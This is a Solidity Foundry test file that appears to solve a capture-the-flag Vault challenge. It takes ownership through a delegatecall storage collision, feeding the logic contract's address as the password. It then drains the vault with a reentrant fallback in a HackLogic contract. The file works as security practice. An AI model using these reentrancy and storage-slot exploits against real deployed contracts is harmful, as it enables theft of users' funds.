// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";


contract HackLogic {
    address  _vault;
    constructor(address vault_)  {
        _vault = vault_;
    }

    function deposite() public payable {
        
        Vault(payable(_vault)).deposite{value: msg.value}();
    }

    function openWithdraw() public {
        Vault(payable(_vault)).openWithdraw();
    }

    function withdraw() public {
        Vault(payable(_vault)).withdraw();
    }


    fallback() external payable{
        console.log("HackLogic fallback");
        if (_vault.balance > 0) {
            Vault(payable(_vault)).withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        {
            HackLogic hack = new HackLogic(address(vault));
            bytes32 password = bytes32(uint256(uint160(address(logic))));
            address newOwner = address(hack);
            bytes memory callData = abi.encodeWithSignature("changeOwner(bytes32,address)", password, newOwner);
            address(vault).call(callData);
            hack.deposite{value: 0.01 ether}();
            hack.openWithdraw();
            hack.withdraw();



        }

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
